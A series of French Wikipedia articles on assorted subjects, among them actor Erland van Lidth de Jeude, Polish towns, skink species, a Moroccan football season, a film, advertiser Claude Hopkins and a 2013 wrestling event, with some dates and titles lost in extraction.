Erland Van Lidth de Jeude est né à Hilversum, aux Pays-Bas, et a rejoint les États-Unis avec sa famille en 1958, où ils ont habité à Orange, New Jersey (jusqu'en 1960), puis Stamford, Connecticut (1960–1962), Ridgefield, Connecticut (1962–1970), et à Mont Vernon, New Hampshire (1970–1973).
Après avoir suivi des études d'informatique à l'Institut technologique du Massachusetts il obtient un diplôme en informatique et génie électrique en 1977.
Pendant ses études il fait partie de la fraternité d'étudiants Beta Theta Pi.
Il se distingue aussi en lutte ainsi qu'au théâtre, son plus grand succès étant dans "Le forum en folie" où il incarne le rôle de "Miles Gloriosus".
Après ses études il travaille comme informaticien à Manhattan tout en se préparant pour les Jeux Olympiques d'été de 1976 à Montréal où il est remplaçant dans l'équipe de lutte des États-Unis.
Sa préparation pour les Jeux olympiques d'été de 1980 à Moscou est interrompue lorsque les États-Unis ont boycotté l'événement. Il a également remporté une médaille de bronze lors d'une rencontre internationale à Téhéran en 1978.
Son physique imposant (1,98 m et 170 kg) l'amène à être remarqué dans le club d'athlétisme de New York par un directeur de casting, ce qui lui offre son premier rôle au cinéma, le redoutable "Terror", chef de la bande des Baldies dans le film "Les Seigneurs" de Philip Kaufman, en 1979.
Il poursuit sa carrière au cinéma sans abandonner ses études d'informatique et continue l'opéra en chantant régulièrement à l'Amato Opera de New York.
Il poursuit sa carrière cinématographique notamment dans "Faut s'faire la malle" avec Richard Pryor et Gene Wilder.
Erland joue ensuite avec Arnold Schwarzenegger dans ce qui sera son dernier film "Running Man" où il joue le rôle de Dynamo, un sadique qui prend plaisir à électrocuter ses victimes. Ce rôle lui permet aussi d'utiliser ses talents de chanteur.
Mort.
Erland Van Lidth De Jeude meurt d'une insuffisance cardiaque le , quelques mois après la fin du tournage de "Running Man". Il avait 34 ans.
Vie privée.
Erland van Lidth de Jeude a épousé Annette Friend le , avec qui il aura un fils, Christiaan.
Son frère Philip van Lidth de Jeude, qui a joué dans un film néerlandais pour enfants "Abeltje" (réalisé en novembre 1998), et sa sœur Philine van Lidth de Jeude sont aussi des chanteurs d'opéra.
Il est issu d'une famille noble des Pays-Bas, les Van Lidth de Jeude et pouvait prétendre au titre de "Jonkheer".

</doc>
<doc id="6805634" url="https://fr.wikipedia.org/wiki?curid=6805634" title="Zakliczyn">
Zakliczyn

Zakliczyn () est une ville de Pologne, située dans le sud du pays, dans la voïvodie de Petite-Pologne. Elle est le chef-lieu de la gmina de Zakliczyn, dans le powiat de Tarnów.

</doc>
<doc id="6805635" url="https://fr.wikipedia.org/wiki?curid=6805635" title="Presse marocaine">
Presse marocaine



</doc>
<doc id="6805653" url="https://fr.wikipedia.org/wiki?curid=6805653" title="Jumpin' In">
Jumpin' In

 Jumpin’ In est un album du Dave Holland Quintet.
Description.
 Jumpin’ In est le premier album du Dave Holland Quintet, une formation alors sans instrument harmonique, pas de piano, ni vibraphone qui sera plus tard une composante importante du groupe.
L’album est souvent décrit comme un album majeur de Dave Holland.
Titres.
Sauf indication tous les morceaux sont composés par Dave Holland

</doc>
<doc id="6805661" url="https://fr.wikipedia.org/wiki?curid=6805661" title="Tray Deee">
Tray Deee

Tray Deee, de son vrai nom Tracy Lamar Davis, né le à Long Beach, en Californie, est un rappeur américain, connu pour ses périodes avec les labels Death Row et Doggystyle. En 2002, il publie son premier album solo, "". Après neuf ans de prison pour tentative de meurtre, Deee est libéré en et reforme Tha Eastsidaz avec Snoop Dogg.
Biographie.
Tracy Lamar Davis est né le à Long Beach, en Californie. En 1994, Deee se fait connaître en participant à la bande originale du film ' de Dr. Dre. Un an plus tard, il apparaît sur un des titres de l'album ' du groupe Tha Dogg Pound, puis en 1996 à celui de Snoop Dogg, '. En 1997, il participe aux bandes originales des films ' et "Flics sans scrupules" avec Tupac Shakur. L'année suivante, il est invité sur les albums de Nate Dogg et Mack 10 (respectivement ' et '). Il reste dans les mémoires pour avoir fait partie du groupe de rap Tha Eastsidaz, avec ses deux amis Snoop Dogg et Goldie Loc. Le groupe sorti ses albums sous leur propre label, IV Life Records, chez qui signe Tray Deee.
Avant de devenir un rappeur, Davis était un membre du gang des Insane Crips de Long Beach. En 1998 et 1999 (année où il est invité par Dre à poser sur son album "Chronic 2001"), il participe aux deux albums du rappeur Kurupt (' et '), puis en 2000 (année où il apparaît en featuring sur la chanson de Snoop mondialement connue ' de son album ') et 2001 à ceux de Daz Dillinger ("R.A.W." et '), avec qui il avait déjà fait un featuring sur son album de 1998 intitulé '. Il collabore également sur les albums du rappeur de Long Beach Soopafly, sur les albums ' publié en 2001 et ' publié en 2009. En 2002, Deee publie son premier album solo, ' le classé du ' 200.
Le , Tray Dee est condamné à une peine de 12 ans de prison pour tentative de meurtre commise en 2003 (où il avait ouvert le feu sur un membre de gang rival). Il purge sa peine à la prison de California Men's Colony à San Luis Obispo avec une possible libération en 2013. Au début d', après neuf ans de prison, Deee est libéré et relance Tha Eastsidaz aux côtés des Snoop Dogg. Pendant son séjour en prison, il écrit quelques mixtapes qu'il compte publier à sa sortie. Les 18 et , Tray Deee se réunit avec Goldie Loc pour chanter au "Krush Groove 2014" au Save Mart Center de Fresno et au Forum d'Inglewood.

</doc>
<doc id="6805672" url="https://fr.wikipedia.org/wiki?curid=6805672" title="Saison 2012-2013 du Raja Club Athletic">
Saison 2012-2013 du Raja Club Athletic

La saison 2012-2013 du Raja Club Athletic est la de l'histoire du club depuis sa fondation le 20 mars 1949. Elle fait suite à la saison 2009-2010 dans laquelle le Raja a terminé quatrième en championnat. M'hamed Fakhir commence sa deuxième saison en tant qu'entraîneur du Raja CA après celle de 2010-2011.
Au titre de cette saison, le Raja CA est engagé dans trois compétitions officielles: Championnat, Coupe du Trône 2011 et Coupe de l'UAFA. Les "Verts" remportent alors le deuxième doublé coupe-championnat de leur histoire.
Le meilleur buteur de la saison est Mouhcine Iajour avec 12 buts inscrits toutes compétitions confondues, tandis que le meilleur passeur est Chems-Eddine Chtibi avec 10 passes décisives.
Mercato d'été 2012.
Départs.
Le , Hassan Souari décide de mettre les voiles en direction de la Renaissance sportive de Berkane après un an et demi de contrat avec le Raja.
Matchs amicaux de préparation.
Les principaux matchs amicaux d'avant-saison :&lt;br&gt;
 Olympique du Kef&lt;br&gt; Étoile du Sahel&lt;br&gt; Athletic Bilbao&lt;br&gt; FC Barcelone&lt;br&gt; Jeunesse sportive de Kabylie&lt;br&gt; JS Saoura&lt;br&gt; Racing Athletic Club&lt;br&gt; CODM Meknès&lt;br&gt; Raja de Beni Mellal&lt;br&gt; Union de Mohammédia&lt;br&gt; Youssoufia Berrechid
Feuille de match 1
Feuille de match 2
Feuille de match 3
Feuille de match 4
Feuille de match 5
Feuille de match 6
Feuille de match 7
Feuille de match 8
Feuille de match 9
Feuille de match 10
Feuille de match 11
Effectif professionnel.
!colspan=7 style="background: #FFFFFF" align=center| Gardiens
!colspan=7 style="background: #FFFFFF" align=center| Défenseurs
!colspan=7 style="background: #FFFFFF" align=center| Milieux
!colspan=7 style="background: #FFFFFF" align=center| Attaquants
Coupe du Trône.
Le Raja CA entame la compétition à partir des seizièmes de finale par son statut de club de première division contrairement à certains autres clubs. Il commence donc son premier match le face à l'Olympique de Safi.
Le Raja réussit à se qualifier pour le tour suivant après sa victoire face à l'Olympique de Safi le dans le cadre des seizièmes de finale. Lors de ce tour, "les verts" ont réussi à éliminer les safiotes par deux buts à zéro. C'est Hamza Abourazzouk qui ouvre le score à la avant d'être suivi par Mohsine Moutouali grâce à un pénalty à la .
Après cette victoire, le club doit ensuite affronter le Hassania d'Agadir pour le compte des huitièmes de finale. Lors de ce match le Raja joue donc ainsi à Casablanca devant son public. La rencontre se termine par une victoire des casablancais sur le score de deux buts un. Le jeune Abdelilah Hafidi ouvre le score dès la puis c'est ensuite à la nouvelle recrue venant du Wydad de Casablanca Iajour a marqué avant que le Hassania d'Agadir ne réduise l'écart lors de la sans toutefois parvenir à égaliser.
Pour le compte des quarts de finale, l'équipe doit ensuite se mesurer au Kawkab de Marrakech dans son stade le . Cette rencontre se terminera par une victoire très difficile par le plus petit des scores, un but à zéro grâce à une réalisation d'Abdelilah Hafidi qui inscrit son second but dans la compétition.
Lors des demi-finales, le club se voit affronter son pire ennemi, le Wydad pour le compte d'un derby casablancais qui se déroule le . Le match débute donc lors de cette journée mais après une mi-temps sans qu'aucun des deux clubs n'inscrit un moindre but, l'arbitre siffle le début de la seconde mi-temps. Jusqu’à la de très grand fait marquant marquant sont à signaler jusqu'à l'ouverture du score par Fabrice Ondama au profit du Wydad. Mais le Raja réussira ainsi à provoquer une faute signalé par l'arbitre pénalty ce que les "Wydadis" affirmeront comme quoi la faute n'a pas eu lieu dans la surface, mais en dehors. Ainsi, Mohsine Moutouali ouvre le score à la sur pénalty. Puis lors des prolongations les "verts" inscriront deux autres buts, un inscrit par Yassine Salhi à la de jeu et l'autre par Abdelilah Hafidi lors de la . L'équipe réussit donc à remporter son en coupe du Trône.
Le Raja affronte ensuite les FAR de Rabat en finale de la coupe du Trône pour ce qui est la finale depuis la création de la compétition en 1956. Cette finale a lieu à Rabat le . Cette rencontre se terminera sur le score vierge de zéro but partout même après des prolongations. Ainsi une séance de tirs au but a donc lieu et le Raja s'est montré plus adroit que son homologue l'AS FAR. Le club a remporté son septième titre dans la compétition en réussissant à réduire l'écart avec le Wydad qui en possède neuf et les FAR de Rabat qui détiennent onze titres.

</doc>
<doc id="6805673" url="https://fr.wikipedia.org/wiki?curid=6805673" title="Désiré Serruys">
Désiré Serruys

Désiré Charles Serruys, né le à Ostende et y décédé le est homme politique libéral belge flamand.
Il fut rentier, candidat notaire, artiste peintre portraitiste ; il fut élu député belge.
Il fut créé chevalier de l'ordre de Léopold.

</doc>
<doc id="6805674" url="https://fr.wikipedia.org/wiki?curid=6805674" title="Waxweazle">
Waxweazle



</doc>
<doc id="6805676" url="https://fr.wikipedia.org/wiki?curid=6805676" title="Les Miller, une famille en herbe">
Les Miller, une famille en herbe

Les Miller, une famille en herbe ou Nous sommes les Miller au Québec (") est une comédie américaine réalisée par Rawson Marshall Thurber, sortie en 2013.
Synopsis.
David, un vendeur de drogue de bas étage, se fait dérober sa marchandise ainsi que le contenu de son coffre-fort par trois voyous. Il ne peut plus donner l'argent des ventes à Brad, son fournisseur. David a désormais une dette envers ce dernier. Brad, pour effacer l'ardoise de David, lui demande de rapporter une cargaison de drogue du Mexique. Celle-ci provient de Bob Walter.
David réfléchit à la meilleure méthode pour franchir la frontière entre les États-Unis et le Mexique puis revenir et passer à nouveau la frontière. Il juge que la meilleure manière pour rester discret est de se faire passer pour une famille modèle. Il va alors engager Rose, sa voisine strip-teaseuse, pour la faire passer pour sa femme. Il recrute aussi Kenny, un garçon de dix-huit ans qui vit en dessous de chez lui et qui est sans nouvelle de sa mère, seule parente, depuis une semaine, puis Casey, une jeune fugueuse, afin qu'ils tiennent le rôle des enfants du soi-disant couple.
Ils partent tous les quatre à bord d'un camping-car pour franchir la frontière. Mais en arrivant chez le producteur, David se rend compte que la quantité de drogue est plus importante que ce qu'il pensait. Il repart alors vers les États-Unis, mais les problèmes s'enchaînent. Entre le radiateur du camping-car qui casse, la rencontre avec une famille dont le mari est un agent de la DEA, et les producteurs mexicains qui tentent de les rattraper après avoir compris qu'ils ont été volés, le voyage de la famille Miller accumule les difficultés.
Distribution.
Version française
Version québécoise
Production.
Auditions.
C'est la troisième fois que Jason Sudeikis et Jennifer Aniston tournent ensemble après "Le Chasseur de primes" en 2010 et "Comment tuer son boss ?" en 2011. Nick Offerman et Kathryn Hahn se retrouvent également après avoir joué dans la saison 4 de "Parks and Recreation". Jennifer Aniston et Kathryn Hahn se connaissent également, puisqu'elles ont joué ensemble dans "Peace, Love et plus si affinités" en 2012 et "Broadway Therapy" en 2014.
Pour le rôle principal joué par Jason Sudeikis, plusieurs acteurs ont été pressentis : Jason Bateman, Will Arnett ou encore Steve Buscemi.
Adam Driver devait à l'origine interpréter le rôle de "Scottie P." mais c'est finalement Mark L. Young qui a obtenu le rôle.
Tournage.
Le tournage du film a débuté le à Wilmington, en Caroline du Nord. Certaines scènes ont également été tournées au Nouveau-Mexique et à l'aéroport d'Albuquerque. Le tournage s'est achevé le .
Accueil.
Accueil critique.
"Les Miller, une famille en herbe" a rencontré un accueil critique mitigé aux États-Unis, recueillant 47 % d'avis positifs sur le site Rotten Tomatoes, basé sur 145 commentaires collectés et une note moyenne de 5,4/10.
Le site Metacritic lui attribue un score de 44/100, basé sur 38 commentaires collectés.
En France, le film rencontre également un accueil critique mitigé, obtenant une note moyenne de sur le site AlloCiné, basée sur 12 commentaires collectés.
En revanche, le film est bien accueilli par les spectateurs. En effet, il obtient la moyenne de 7,1/10 sur le site IMDB sur un total de notes. Sur AlloCiné, il obtient une note moyenne de , basée sur notes dont 550 critiques.
Box-office.
Dès sa sortie en salles aux États-Unis, "Les Miller, une famille en herbe" s'empare de la deuxième place du box-office avec dollars pour son premier week-end d'exploitation et dollars en première semaine d'exploitation. En 1 mois, le film a engrangé un total de dollars.
C'est le plus gros succès du mois d’ aux États-Unis. Finalement, le film rapporte 150,4 millions de dollars après dix-sept semaines à l'affiche.
En France, "Les Miller, une famille en herbe" prend la troisième place du box-office lors de sa première semaine avec entrées, mais chute en cinquième position la semaine suivante, avec entrées, soit un cumul de entrées. Il se maintient en onzième position durant sa troisième et quatrième semaine, où il totalise respectivement entrées et entrées, portant le total à entrées. Resté sept semaines en salles, "Les Miller, une famille en herbe" finit avec entrées.
Sortie vidéo.
"Les Miller, une famille en herbe" sort en DVD et Blu-ray le en région 1 et le en région 2.

</doc>
<doc id="6805682" url="https://fr.wikipedia.org/wiki?curid=6805682" title="Ryglice">
Ryglice

Ryglice est une ville de Pologne, située dans le sud du pays, dans la voïvodie de Petite-Pologne. Elle est le chef-lieu de la gmina de Ryglice, dans le powiat de Tarnów.

</doc>
<doc id="6805683" url="https://fr.wikipedia.org/wiki?curid=6805683" title="Tropidophorus matsuii">
Tropidophorus matsuii

Tropidophorus matsuii est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique de l'Est de la Thaïlande.
Étymologie.
Cette espèce est nommée en l'honneur de Masafumi Matsui.

</doc>
<doc id="6805689" url="https://fr.wikipedia.org/wiki?curid=6805689" title="L'Enfer en retour">
L'Enfer en retour

L'Enfer en retour ("Hell and Back") est le septième volet de la série de comics "Sin City" de Frank Miller. Il a été publié aux États-Unis par Dark Horse Comics en 9 "issues" entre et . En France, l'album est publié par Rackham en .
Résumé.
Wallace est un vétéran de la Guerre du Viêt Nam. De retour à Basin City, il est désormais dessinateur de presse. Une nuit, alors qu'il se balade seul, il aperçoit une fille qui s'apprête à sauter dans le vide. Wallace la sauve. Elle s'appelle Esther. Il tombe rapidement amoureux d'elle. Mais le bonheur est de courte durée car la jeune femme est enlevée ! Wallace va alors tout faire pour la retrouver...

</doc>
<doc id="6805690" url="https://fr.wikipedia.org/wiki?curid=6805690" title="Tropidophorus murphyi">
Tropidophorus murphyi

Tropidophorus murphyi est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique du Nord du Viêt Nam.
Étymologie.
Cette espèce est nommée en l'honneur de Robert Ward Murphy.

</doc>
<doc id="6805693" url="https://fr.wikipedia.org/wiki?curid=6805693" title="Tropidophorus latiscutatus">
Tropidophorus latiscutatus

Tropidophorus latiscutatus est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique de Thaïlande.

</doc>
<doc id="6805697" url="https://fr.wikipedia.org/wiki?curid=6805697" title="Radłów (Petite-Pologne)">
Radłów (Petite-Pologne)

Radłów est une ville de Pologne, située dans le sud du pays, dans la voïvodie de Petite-Pologne. Elle est le chef-lieu de la commune de Radłów, dans le powiat de Tarnów.

</doc>
<doc id="6805698" url="https://fr.wikipedia.org/wiki?curid=6805698" title="La Ménagerie du Vatican">
La Ménagerie du Vatican

"La Ménagerie du Vatican, ou Le Livre de la noblesse pontificale", est un pamphlet sur la noblesse pontificale de Jean de Bonnefon paru 1906.

</doc>
<doc id="6805704" url="https://fr.wikipedia.org/wiki?curid=6805704" title="CBC Banque &amp; Assurance">
CBC Banque &amp; Assurance

CBC Banque est une filiale de KBC Group, groupe belge international. En 2016, ses agences de Bruxelles sont reprises par KBC Group. Elle est présente en Wallonie hors cantons germanophones avec un réseau d’agences bancaires et d’assurances ainsi que des Centres de banque privée.
Historique.
CBC Banque &amp; Assurance est née de la fusion, en 1998, du Crédit Général, d’ABB-assurances et de la Banque CERA.
En 2016, la banque est scindée en deux : KBC Brussels pour Bruxelles et CBC pour la Wallonie francophone, dont le siège social est déplacé à Namur en 2018.

</doc>
<doc id="6805705" url="https://fr.wikipedia.org/wiki?curid=6805705" title="O Ses Türkiye">
O Ses Türkiye

O Ses Türkiye est une émission de télévision de télé-crochet, version turque du concept "The Voice" inauguré par l'émission néerlandaise "The Voice of Holland".
Liste des coachs par Saison.
Saison 9 - actuelle.
Hadise Açıkgöz (1-)
Murat Boz (1-3,5-)
Beyazıt Öztürk (8-)
Seda Sayan (8-)
Précédent.
Mustafa Sandal (1-2)
Hülya Avşar (1-2)
Mazhar Alanson (duo : 4)
Özkan Uğur (duo : 4)
Ebru Gündeş (3-5)
Sibel Can (6)
Hakan Özoğuz (duo : 5-6)
Yıldız Tilbe (7)
Gökhan Özoğuz (solo : 3-4,7; duo : 5-6)
Saison 1 (2011-2012).
La première saison de "O Ses Türkiye" a été diffusée du au sur Show TV. Elle a été présentée par Acun Ilıcalı et les quatre coachs étaient Mustafa Sandal, Hülya Avşar, Hadise et Murat Boz. Le vainqueur est Oğuz Berkay Fidan, coaché par Murat Boz.
Saison 2 (2012-2013).
La deuxième saison de "O Ses Türkiye" a débuté sur une nouvelle chaîne, Star TV, mais avec le même présentateur et les mêmes coachs.

</doc>
<doc id="6805706" url="https://fr.wikipedia.org/wiki?curid=6805706" title="La Setmana">
La Setmana

La Setmana ("la semaine", en occitan) est un hebdomadaire entièrement en langue occitane édité par la société Vistedit depuis 1995. Son fondateur et rédacteur en chef fut le journaliste David Grosclaude de 1995 à 2010.
Ses collaborateurs les plus réguliers sont André Bianchi, Nicolas Rey-Bèthbéder.
"La Setmana" est imprimée par l'imprimerie du quotidien catalan El Punt à Gérone, et distribuée à ses abonnés à partir de Perpignan. Malgré l'absence d'aide à la presse qu'elle juge discriminatoire, "la Setmana" tire à plus de mille exemplaires. Sa maquette a été remaniée en 2003. En , une version en ligne sur internet est disponible.
Elle cesse de paraître en .

</doc>
<doc id="6805707" url="https://fr.wikipedia.org/wiki?curid=6805707" title="Tropidophorus noggei">
Tropidophorus noggei

Tropidophorus noggei est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique de la province de Quảng Bình au Viêt Nam.
Étymologie.
Cette espèce est nommée en l'honneur de Gunther Nogge.

</doc>
<doc id="6805708" url="https://fr.wikipedia.org/wiki?curid=6805708" title="Alexandre Bleïch">
Alexandre Bleïch

Alexandre Nikolaïevitch Bleïch (en ), décédé en à Novorossiisk, est un colonel russe des armées blanches du Sud de la Russie, vétéran de la Première Guerre mondiale.
Révolution.
En novembre 1917 Bleïch est nommé commandant du d’assaut d’Orenbourg, faisant partie des unités d’assaut formées sur ordre du commandant en chef des armées général Doukhonine. Initialement le régiment était destiné à protéger l’état-major général face aux attaques des bolchéviques. Le le régiment est envoyé vers le Don mais est défait lors de combats du au .
Fin 1917 Bleïch est promu colonel.
Dans les armées blanches.
Alexandre Bleïch est blessé à l’automne 1918 et ne repris son service qu’en en tant que commandant du premier bataillon. Lors des combats pour le Donbass il est de nouveau blessé fin .
En mars 1920 Alexandre Bleïch décède du typhus à Novorossiisk lors de l’évacuation de l’armée.

</doc>
<doc id="6805709" url="https://fr.wikipedia.org/wiki?curid=6805709" title="Nowy Wiśnicz">
Nowy Wiśnicz

Nowy Wiśnicz est une ville de Pologne, située dans le sud du pays, dans la voïvodie de Petite-Pologne. Elle est le chef-lieu de la gmina de Nowy Wiśnicz, dans le powiat de Bochnia.

</doc>
<doc id="6805715" url="https://fr.wikipedia.org/wiki?curid=6805715" title="Tanya De Souza">
Tanya De Souza



</doc>
<doc id="6805719" url="https://fr.wikipedia.org/wiki?curid=6805719" title="Kalwaria Zebrzydowska">
Kalwaria Zebrzydowska

Kalwaria Zebrzydowska est une ville de Pologne, située dans le sud du pays, dans la voïvodie de Petite-Pologne. Elle est le chef-lieu de la gmina de Kalwaria Zebrzydowska, dans le powiat de Wadowice. Elle est connue pour son sanctuaire, inscrit au Patrimoine mondial de l'UNESCO.

</doc>
<doc id="6805721" url="https://fr.wikipedia.org/wiki?curid=6805721" title="Tropidophorus boehmei">
Tropidophorus boehmei

Tropidophorus boehmei est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique de la province de Lào Cai au Viêt Nam.
Étymologie.
Cette espèce est nommée en l'honneur de Wolfgang Böhme.

</doc>
<doc id="6805723" url="https://fr.wikipedia.org/wiki?curid=6805723" title="Annick Béguin">
Annick Béguin



</doc>
<doc id="6805724" url="https://fr.wikipedia.org/wiki?curid=6805724" title="Buddleja forrestii">
Buddleja forrestii

Buddleja forrestii est une espèce de "Buddleja" appartenant à la famille des "Buddlejaceae", nommée d'après le botaniste George Forrest (1873-1932) qui la découvrit en 1904 dans le Yunnan et l'introduisit en Europe. Cette espèce est largement distribuée de l'Inde septentrionale à la Chine occidentale.
Taxonomie.
Cette espèce a été étudiée par Ludwig Diels en 1912.
Description.
"Buddleja forrestii" peut croître jusqu'à six mètres de hauteur dans son habitat naturel. Ce buddléia se distingue par ses longues panicules terminales qui mesurent jusqu'à vingt-cinq centimètres de longueur. Ses fleurs presque sans parfum qui fleurissent à la fin de l'été peuvent varier du mauve au blanc. Ses branches tétragones portent des feuilles lancéolées et opposées, jusqu'à vingt-cinq centimètres de longueur. Le dessous est recouvert de poils d'un rouge brunâtre 2"n" = 114.
Culture.
En Europe, "Buddleja forrestii" apprécie plutôt les régions méditerranéennes. Dans les zones situées plus au nord, il doit être planté près d'un mur orienté au sud, ou abrité en serre en hiver, au nord de la France.

</doc>
<doc id="6805725" url="https://fr.wikipedia.org/wiki?curid=6805725" title="Algérien en France">
Algérien en France



</doc>
<doc id="6805730" url="https://fr.wikipedia.org/wiki?curid=6805730" title="Georges Chalandon">
Georges Chalandon

Georges Claude Louis Pie Chalandon (né le à Lyon et mort le à Aix-en-Provence) est un archevêque français du qui a été archevêque d'Aix-en-Provence de à .
Biographie.
Coadjuteur d'Alexandre Devie, évêque de Belley, il est sacré évêque titulaire de le 0. Il succède le à Devie à son siège, puis est promu archevêque d'Aix-en-Provence le où il décèdera le .
Armes.
D'azur à un Saint-Georges de carnation, vêtu et nimbé d'or, portant un bouclier d'argent à la croix d'azur, monté sur un cheval de bataille effaré, bardé, houssé et caparaçonné d'or, foulant aux pieds un dragon ailé de sinople, près d'une église d'argent posée à sénestre ; à la champagne d'argent chargée d'un roquet de gueules, accosté de 4 têtes de clou de sable.

</doc>
<doc id="6805732" url="https://fr.wikipedia.org/wiki?curid=6805732" title="Claude C. Hopkins">
Claude C. Hopkins

Claude Clarence Hopkins (1866-1932) fut l'un des pionniers de la publicité moderne et concepteur-rédacteur de génie. Il était persuadé que la publicité n'existait que pour vendre quelque chose et que ses effets devaient être mesurables pour justifier les résultats qu'elle produit.
Biographie.
Élevé par des parents universitaires, Claude Hopkins fut très tôt un bourreau de travail. Il eut donc une enfance très laborieuse et à la mort de son père à l'âge de 10 ans, commença à soutenir sa mère. Sa vie professionnelle extrêmement dense, lui fit découvrir toutes sortes de métiers, comme vendeur de journaux à la criée, ouvrier agricole dans une laiterie, chef de chorale et de l'école du dimanche, agent d'entretien. 
Les balais Bissell.
Après avoir pris un travail comme employé de bureau misérable chez "The Felt Boot Company" à Grand Rapids, il rencontra l'homme d'affaires Melvin Bissell, président de "Bissell Carpet Sweeper Company", qui, surpris de voir un jeune homme animé d'une aussi grande force de travail, l'embaucha sur le champ. Ainsi Claude Hopkins devint rapidement un employé de bureau incontournable et gravit rapidement les rangs. Bientôt, il se rendit compte que le seul moyen de progresser était de devenir vendeur. Il réussit alors à convaincre la direction de lui donner sa chance. 
Étant dans la saison de Noël, il proposa aux distributeurs de la marque d'installer gratuitement des présentoirs à balais Bissell avec des cartes . Sur 5000 lettres envoyés aux distributeurs, il reçut 1000 commandes.
Bientôt il devint le meilleur vendeur de la marque en multipliant les offres proposées aux distributeurs, en créant une identité forte et en lançant une version des balais en bois vermillon acheté en Inde.
Swift &amp; Company.
Après une campagne pour se faire embaucher comme chargé de la publicité dans la compagnie "Swift &amp; Company" de Chicago, Hopkins lance une campagne de terrain, pour présenter le plus grand gâteau du monde, fait en margarine de Swift dans le rayon épicerie d'un grand magasin. Le succès est considérable et fait entrer dans le magasin, et crée une énorme couverture médiatique.
Lord &amp; Thomas.
En 1907, à l'âge de 41 ans, il rejoint alors l'agence Lord &amp; Thomas de Chicago comme concepteur-rédacteur.
Il a été embauché par le fameux publicitaire Albert Lasker patron de l'agence Lord &amp; Thomas pour un salaire considérable pour l'époque de dollars par an.
Accroches inventées par Hopkins.
Claude Hopkins crée des campagnes publicitaires autour d'accroches célèbres: 
L'un des faits d'armes d'Hopkins est de populariser l'habitude du brossage des dents, en faisant une campagne pour le dentifrice Pepsodent.
Il lance également le savon "Palmolive", pour la "B.J. Johnson Soap Company" de Milwaukee grâce à une technique de couponing, qui en fit en un très court laps de temps, le savon le plus vendu aux États-Unis et dans le monde, dès 1911.
Ainsi dès 1917, la compagnie change son nom en "Palmolive Company" et rachète la "Colgate Soap Company" en 1928, pour devenir progressivement le plus grand conglomérat de l'industrie.
Hopkins insiste pour que ses rédacteurs fassent des recherches sur les produits de leurs clients afin de produire un texte qui soit la (reason-why). 
Il croit qu'un bon produit est souvent son meilleur vendeur et est donc partisan de l'échantillon, payé et non pas gratuit, proposé au public.
Pour suivre les résultats de sa publicité, il utilise la méthode des coupons codés et testés avec différents titres, offres et propositions les uns contre les autres, pour voir les messages les plus efficaces. Il utilise l'analyse de ces mesures afin d'améliorer continuellement ses résultats pour produire de meilleures annonces.
Son livre classique, "La publicité scientifique" ("Scientific Advertising") est écrit en 1923, après sa retraite de Lord &amp; Thomas, où il termine sa carrière en tant que président en remplacement d'Albert Lasker. 
Ce livre est suivi, en 1927, par son autobiographie, ("My Life in Advertising").
Il décède d'une crise cardiaque dans sa résidence de Spring Lake dans le Michigan en 1932.

</doc>
<doc id="6805736" url="https://fr.wikipedia.org/wiki?curid=6805736" title="Hamada Nampiandraza">
Hamada Nampiandraza

Hamada el Moussa Nampiandraza , né le , est un arbitre malgache de football, qui officie internationalement depuis 2010.
Carrière.
Il a officié dans des compétitions majeures : 

</doc>
<doc id="6805740" url="https://fr.wikipedia.org/wiki?curid=6805740" title="Okada Saburōsuke">
Okada Saburōsuke

 est un peintre japonais des , né en 1869 dans la Préfecture de Saga et mort en 1939 à Tokyo. 
Biographie.
Okada Saburōsuke est l'élève de Soyama Sachihiko (1859-1892) et de Kuroda Seiki. Il voyage en Europe, principalement à Paris où il devient l'élève de Raphaël Collin. De retour au Japon, il est professeur à École des beaux-arts de Tokyo; membre du Comité impérial des Beaux-Arts et de l'Académie impériale des Beaux-Arts de Tokyo.

</doc>
<doc id="6805742" url="https://fr.wikipedia.org/wiki?curid=6805742" title="Royal Rumble (2013)">
Royal Rumble (2013)

L'édition 2013 du "Royal Rumble" est une manifestation de catch professionnel télédiffusée et visible uniquement en paiement à la séance. L'événement, produit par la , s'est déroulé le dans la salle omnisports du US Airways Center, à Phoenix en Arizona, aux États-Unis. Il s'agit de la vingt-sixième édition du ', ' annuel qui, comme son nom l'indique, propose un Royal Rumble match en tête d'affiche. Le show est le premier "pay-per-view" de la WWE en 2013. The Rock est la vedette de l'affiche officielle.
En plus du traditionnel Royal Rumble match, le show comprend en tête d'affiche deux matches mettant en jeu les titres dits « mondiaux » de la fédération : le WWE et le World Heavyweight Championship. Chacun d'entre eux est déterminé par des ' rédigées par les scénaristes de la WWE ; soit par des rivalités survenues avant le ', soit par des matchs de qualification en cas de rencontre pour un championnat.
Contexte.
Les spectacles de la ' en paiement à la séance sont constitués de matchs aux résultats prédéterminés par les scénaristes de la WWE. Ces rencontres sont justifiées par des ' — une rivalité avec un catcheur, la plupart du temps — ou par des qualifications survenues dans les émissions de la WWE telles que "Raw", "SmackDown", "Superstars" et "Main Event". Tous les catcheurs possèdent un gimmick, c'est-à-dire qu'ils incarnent un personnage gentil ou méchant, qui évolue au fil des rencontres. Un ' comme ' est donc un événement tournant pour les différentes "" en cours.
Royal Rumble match.
Comme chaque année depuis 1988, le "pay-per-view" comportera un Royal Rumble match dans lequel le vainqueur aura une opportunité d'avoir un match soit pour le WWE Championship ou pour le World Heavyweight Championship, selon son choix, à "WrestleMania 29".
Lors du dernier "Raw" de 2012, le 31 décembre, John Cena est le premier à annoncer officiellement qu'il sera bel et bien présent dans le 30-Man Royal Rumble match pour espérer devenir le prétendant au titre mondial de son choix à "WrestleMania", après une année entière sans être ni WWE Champion ni World Heavyweight Champion. Le lors de "SmackDown", Randy Orton et Sheamus annoncent tous deux qu'ils participeraient au Royal Rumble, espérant ainsi obtenir une opportunité pour gagner le World Heavyweight Championship.
